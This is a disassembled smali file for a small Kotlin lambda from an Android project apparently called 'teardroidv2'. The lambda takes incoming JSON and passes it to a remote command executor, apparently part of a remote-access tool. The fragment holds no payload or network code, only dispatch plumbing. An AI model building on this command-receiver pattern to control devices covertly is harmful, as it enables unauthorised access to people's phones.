.class final Lcom/example/teardroidv2/CommandReciver$commandReciver$thread$1$1;
.super Lkotlin/jvm/internal/Lambda;
.source "CommandReciver.kt"

# interfaces
.implements Lkotlin/jvm/functions/Function1;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/example/teardroidv2/CommandReciver;->commandReciver$lambda-1(Ljava/lang/String;Lcom/example/teardroidv2/CommandReciver;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x18
    name = null
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Lkotlin/jvm/internal/Lambda;",
        "Lkotlin/jvm/functions/Function1<",
        "Lorg/json/JSONObject;",
        "Lkotlin/Unit;",
        ">;"
    }
.end annotation

.annotation runtime Lkotlin/Metadata;
    d1 = {
        "\u0000\u000e\n\u0000\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\u0010\u0000\u001a\u00020\u00012\u0006\u0010\u0002\u001a\u00020\u0003H\n\u00a2\u0006\u0002\u0008\u0004"
    }
    d2 = {
        "<anonymous>",
        "",
        "it",
        "Lorg/json/JSONObject;",
        "invoke"
    }
    k = 0x3
    mv = {
        0x1,
        0x6,
        0x0
    }
    xi = 0x30
.end annotation


# instance fields
.field final synthetic this$0:Lcom/example/teardroidv2/CommandReciver;


# direct methods
.method constructor <init>(Lcom/example/teardroidv2/CommandReciver;)V
    .locals 0

    iput-object p1, p0, Lcom/example/teardroidv2/CommandReciver$commandReciver$thread$1$1;->this$0:Lcom/example/teardroidv2/CommandReciver;

    const/4 p1, 0x1

    invoke-direct {p0, p1}, Lkotlin/jvm/internal/Lambda;-><init>(I)V

    return-void
.end method


# virtual methods
.method public bridge synthetic invoke(Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0

    .line 92
    check-cast p1, Lorg/json/JSONObject;

    invoke-virtual {p0, p1}, Lcom/example/teardroidv2/CommandReciver$commandReciver$thread$1$1;->invoke(Lorg/json/JSONObject;)V

    sget-object p1, Lkotlin/Unit;->INSTANCE:Lkotlin/Unit;

    return-object p1
.end method

.method public final invoke(Lorg/json/JSONObject;)V
    .locals 1

    const-string v0, "it"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 89
    iget-object v0, p0, Lcom/example/teardroidv2/CommandReciver$commandReciver$thread$1$1;->this$0:Lcom/example/teardroidv2/CommandReciver;

    invoke-static {v0, p1}, Lcom/example/teardroidv2/CommandReciver;->access$commandExecutor(Lcom/example/teardroidv2/CommandReciver;Lorg/json/JSONObject;)V

    return-void
.end method
